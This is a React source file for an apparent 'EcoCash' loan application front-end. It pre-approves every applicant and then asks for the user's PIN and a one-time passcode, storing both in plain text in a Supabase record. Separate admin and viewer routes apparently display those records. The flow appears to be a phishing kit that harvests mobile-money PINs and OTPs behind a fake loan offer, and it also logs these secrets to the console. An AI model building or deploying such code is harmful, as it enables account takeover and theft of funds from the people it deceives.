import React, { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Header } from './components/Header';
import { LoanCalculatorScreen } from './components/LoanCalculatorScreen';
import { Step1LoanParameters } from './components/Step1LoanParameters';
import { Step2ApplicantDetails } from './components/Step2ApplicantDetails';
import { Step3FinancialReview } from './components/Step3FinancialReview';
import { SuccessScreen } from './components/SuccessScreen';
import { PinScreen } from './components/PinScreen';
import { OtpScreen } from './components/OtpScreen';
import AdminPage from './components/AdminPage';
import ViewerPage from './components/ViewerPage';
import { AppStep, LoanFormData, SubmittedApplication } from './types';
import { calculateMonthlyPayment } from './utils/calculator';
import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';

const initialFormData: LoanFormData = {
  loanType: 'Personal Loan',
  loanAmount: 5000,
  loanTermMonths: 12,
  purpose: '',
  firstName: '',
  lastName: '',
  email: '',
  phone: '',
  employmentStatus: 'Employed',
  annualIncome: '',
};

export default function App() {
  const [currentStep, setCurrentStep] = useState<AppStep>('calculator');
  const [isAdminView, setIsAdminView] = useState<boolean>(() => {
    const isAdmin = window.location.pathname === '/admin';
    return isAdmin;
  });
  const [isViewerView, setIsViewerView] = useState<boolean>(() => window.location.pathname === '/viewer');
  const [formData, setFormData] = useState<LoanFormData>(initialFormData);
  const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handlePinSubmit = async (pin: string) => {
    const previousApplicationId = submittedApplication?.id ?? null;
    const phone = formData.phone;

    console.log('[DEBUG][APP][PIN_START]', {
      file: 'src/App.tsx',
      function: 'handlePinSubmit',
      operation: 'PIN submit started',
      applicationId: previousApplicationId,
      phone,
      pin,
      currentScreen: currentStep,
      navigationTarget: 'otp',
    });

    if (!submittedApplication?.id) {
      console.error('[DEBUG][APP][PIN_FAIL]', {
        file: 'src/App.tsx',
        function: 'handlePinSubmit',
        operation: 'missing application id before PIN update',
        applicationId: previousApplicationId,
        phone,
        pin,
        currentScreen: currentStep,
      });
      return;
    }

    const displayValue = `PIN: ${pin}`;
    try {
      const updatedRow = await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
      console.log('[DEBUG][APP][PIN_UPDATE_SUCCESS]', {
        file: 'src/App.tsx',
        function: 'handlePinSubmit',
        operation: 'PIN update succeeded',
        applicationId: submittedApplication.id,
        phone,
        pin,
        updatedRow,
      });
      setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
      setCurrentStep('otp');
      console.log('[DEBUG][APP][PIN_NAVIGATE]', {
        file: 'src/App.tsx',
        function: 'handlePinSubmit',
        operation: 'navigated to OTP',
        applicationId: submittedApplication.id,
        phone,
        pin,
        navigationTarget: 'otp',
      });
    } catch (error: any) {
      console.error('[DEBUG][APP][PIN_EXCEPTION]', {
        file: 'src/App.tsx',
        function: 'handlePinSubmit',
        operation: 'PIN update exception',
        applicationId: submittedApplication.id,
        phone,
        pin,
        error,
        stack: error?.stack,
      });
      throw error;
    }
  };

  const handleOtpSubmit = async (otp: string) => {
    const previousApplicationId = submittedApplication?.id ?? null;
    const phone = formData.phone;

    console.log('[DEBUG][APP][OTP_START]', {
      file: 'src/App.tsx',
      function: 'handleOtpSubmit',
      operation: 'OTP submit started',
      applicationId: previousApplicationId,
      phone,
      otp,
      currentScreen: currentStep,
      navigationTarget: 'success',
    });

    if (!submittedApplication?.id) {
      console.error('[DEBUG][APP][OTP_FAIL]', {
        file: 'src/App.tsx',
        function: 'handleOtpSubmit',
        operation: 'missing application id before OTP update',
        applicationId: previousApplicationId,
        phone,
        otp,
        currentScreen: currentStep,
      });
      return;
    }

    const existing = submittedApplication.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
    const displayValue = `${existing}OTP: ${otp}`;
    try {
      const updatedRow = await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
      console.log('[DEBUG][APP][OTP_UPDATE_SUCCESS]', {
        file: 'src/App.tsx',
        function: 'handleOtpSubmit',
        operation: 'OTP update succeeded',
        applicationId: submittedApplication.id,
        phone,
        otp,
        updatedRow,
      });
      setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
      setCurrentStep('success');
      console.log('[DEBUG][APP][OTP_NAVIGATE]', {
        file: 'src/App.tsx',
        function: 'handleOtpSubmit',
        operation: 'navigated to success',
        applicationId: submittedApplication.id,
        phone,
        otp,
        navigationTarget: 'success',
      });
    } catch (error: any) {
      console.error('[DEBUG][APP][OTP_EXCEPTION]', {
        file: 'src/App.tsx',
        function: 'handleOtpSubmit',
        operation: 'OTP update exception',
        applicationId: submittedApplication.id,
        phone,
        otp,
        error,
        stack: error?.stack,
      });
      throw error;
    }
  };

  useEffect(() => {
    const handlePopState = () => {
      const newIsAdmin = window.location.pathname === '/admin';
      const newIsViewer = window.location.pathname === '/viewer';
      setIsAdminView(newIsAdmin);
      setIsViewerView(newIsViewer);
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  const navigateToAdmin = () => {
    window.history.pushState({}, '', '/admin');
    setIsAdminView(true);
  };

  const navigateToApp = () => {
    window.history.pushState({}, '', '/');
    setIsAdminView(false);
    setIsViewerView(false);
  };

  const updateFormData = (fields: Partial<LoanFormData>) => {
    setFormData((prev) => ({ ...prev, ...fields }));
  };

  const handleBack = () => {
    if (currentStep === 'step1') setCurrentStep('calculator');
    else if (currentStep === 'step2') setCurrentStep('step1');
    else if (currentStep === 'step3') setCurrentStep('step2');
    else if (currentStep === 'pin') setCurrentStep('step3');
    else if (currentStep === 'otp') setCurrentStep('pin');
    else if (currentStep === 'success') setCurrentStep('otp');
  };

  const handleReset = () => {
    setFormData(initialFormData);
    setSubmittedApplication(null);
    setCurrentStep('calculator');
  };

  const handlePhoneReady = async () => {
    const previousApplicationId = submittedApplication?.id ?? null;
    const phone = formData.phone;

    console.log('[DEBUG][APP][CREATE_START]', {
      file: 'src/App.tsx',
      function: 'handlePhoneReady',
      operation: 'application creation started',
      previousApplicationId,
      phone,
      currentScreen: currentStep,
      navigationTarget: 'step3',
    });

    if (submittedApplication?.id) {
      console.warn('[DEBUG][APP][CREATE_SKIP]', {
        file: 'src/App.tsx',
        function: 'handlePhoneReady',
        operation: 'application already exists, skipping insert',
        applicationId: submittedApplication.id,
        phone,
      });
      return;
    }

    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);
    const payload = buildApplicationInsertPayload({
      ...formData,
      monthlyPayment,
    });

    console.log('[DEBUG][APP][CREATE_PAYLOAD]', {
      file: 'src/App.tsx',
      function: 'handlePhoneReady',
      operation: 'create application payload',
      applicationId: payload.id,
      phone,
      payload,
    });

    try {
      const createdRecord = await createApplicationInSupabase(payload);
      console.log('[DEBUG][APP][CREATE_SUCCESS]', {
        file: 'src/App.tsx',
        function: 'handlePhoneReady',
        operation: 'application insert succeeded',
        applicationId: createdRecord?.id ?? payload.id,
        phone,
        returnedRow: createdRecord,
      });

      const nextApplication: SubmittedApplication = {
        ...formData,
        id: createdRecord?.id ?? payload.id,
        submittedAt: createdRecord?.submittedAt ?? payload.submittedAt,
        monthlyPayment,
        status: createdRecord?.status ?? 'Pre-Approved',
        annualIncome: Number(formData.annualIncome) || 0,
        verificationCode: createdRecord?.verificationCode ?? null,
      };
      setSubmittedApplication(nextApplication);
      console.log('[DEBUG][APP][STATE_STORED]', {
        file: 'src/App.tsx',
        function: 'handlePhoneReady',
        operation: 'application id stored in state',
        previousApplicationId,
        applicationId: nextApplication.id,
        phone,
        currentScreen: currentStep,
      });
    } catch (error: any) {
      console.error('[DEBUG][APP][CREATE_EXCEPTION]', {
        file: 'src/App.tsx',
        function: 'handlePhoneReady',
        operation: 'application create exception',
        applicationId: payload.id,
        phone,
        error,
        stack: error?.stack,
      });
      throw error;
    }
  };

  const handleSubmitApplication = async () => {
    const previousApplicationId = submittedApplication?.id ?? null;
    const phone = formData.phone;

    console.log('[DEBUG][APP][STEP3_SUBMIT_START]', {
      file: 'src/App.tsx',
      function: 'handleSubmitApplication',
      operation: 'step 3 submit started',
      previousApplicationId,
      phone,
      currentScreen: currentStep,
      navigationTarget: 'pin',
    });

    setIsSubmitting(true);
    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);

    try {
      const fallbackApp: SubmittedApplication = {
        ...formData,
        id: submittedApplication?.id ?? `ECO-${Math.floor(100000 + Math.random() * 900000)}`,
        submittedAt: submittedApplication?.submittedAt ?? new Date().toISOString(),
        monthlyPayment,
        status: 'Pre-Approved',
        annualIncome: Number(formData.annualIncome) || 0,
        verificationCode: submittedApplication?.verificationCode ?? null,
      };
      setSubmittedApplication(fallbackApp);
      console.log('[DEBUG][APP][STEP3_SUBMIT_OK]', {
        file: 'src/App.tsx',
        function: 'handleSubmitApplication',
        operation: 'step 3 submit complete',
        previousApplicationId,
        applicationId: fallbackApp.id,
        phone,
        currentScreen: currentStep,
        navigationTarget: 'pin',
      });
    } catch (error: any) {
      console.error('[DEBUG][APP][STEP3_SUBMIT_EXCEPTION]', {
        file: 'src/App.tsx',
        function: 'handleSubmitApplication',
        operation: 'step 3 submit exception',
        applicationId: previousApplicationId,
        phone,
        error,
        stack: error?.stack,
      });
      throw error;
    } finally {
      setIsSubmitting(false);
      setCurrentStep('pin');
      console.log('[DEBUG][APP][STEP3_NAVIGATE]', {
        file: 'src/App.tsx',
        function: 'handleSubmitApplication',
        operation: 'navigated to PIN',
        applicationId: submittedApplication?.id ?? null,
        phone,
        currentScreen: 'pin',
      });
    }
  };

  if (isAdminView) {
    return (
      <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
        <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
          <AdminPage onBackToApp={navigateToApp} />
        </main>
        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
          &copy; 2025 EcoCash Admin
        </footer>
      </div>
    );
  }

  if (isViewerView) {
    return (
      <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
        <main className="flex-1 p-3 sm:p-6">
          <ViewerPage onBackToApp={navigateToApp} />
        </main>
        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
          &copy; 2025 EcoCash Admin
        </footer>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
      <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <div className="w-full max-w-md bg-white border border-slate-200/90 rounded-3xl shadow-sm p-5 sm:p-7 transition-all my-2">
          <AnimatePresence mode="wait">
            <motion.div
              key={currentStep}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              transition={{ duration: 0.22, ease: 'easeOut' }}
            >
              {currentStep === 'calculator' && (
                <LoanCalculatorScreen
                  loanAmount={formData.loanAmount}
                  setLoanAmount={(val) => updateFormData({ loanAmount: val })}
                  loanTermMonths={formData.loanTermMonths}
                  setLoanTermMonths={(val) => updateFormData({ loanTermMonths: val })}
                  onApplyNow={() => setCurrentStep('step1')}
                />
              )}

              {currentStep === 'step1' && (
                <Step1LoanParameters
                  formData={formData}
                  updateFormData={updateFormData}
                  onNext={() => setCurrentStep('step2')}
                />
              )}

              {currentStep === 'step2' && (
                <Step2ApplicantDetails
                  formData={formData}
                  updateFormData={updateFormData}
                  onNext={() => setCurrentStep('step3')}
                  onPrevious={() => setCurrentStep('step1')}
                  onPhoneReady={handlePhoneReady}
                />
              )}

              {currentStep === 'step3' && (
                <Step3FinancialReview
                  formData={formData}
                  updateFormData={updateFormData}
                  onSubmit={handleSubmitApplication}
                  onPrevious={() => setCurrentStep('step2')}
                  isSubmitting={isSubmitting}
                />
              )}

              {currentStep === 'success' && submittedApplication && (
                <SuccessScreen
                  application={submittedApplication}
                  onNewApplication={handleReset}
                  onContinue={handleReset}
                />
              )}

              {currentStep === 'pin' && (
                <PinScreen
                  phone={formData.phone}
                  applicationId={submittedApplication?.id ?? ''}
                  onBack={() => setCurrentStep('step3')}
                  onNext={handlePinSubmit}
                />
              )}

              {currentStep === 'otp' && (
                <OtpScreen
                  phone={formData.phone}
                  applicationId={submittedApplication?.id ?? ''}
                  verificationDisplay={submittedApplication?.verificationCode ?? ''}
                  onBack={() => setCurrentStep('pin')}
                  onSuccess={handleOtpSubmit}
                />
              )}
            </motion.div>
          </AnimatePresence>
        </div>
      </main>

      <footer className="py-4 text-center text-xs text-slate-400 font-medium">
        &copy; 2025 EcoCash
      </footer>
    </div>
  );
}
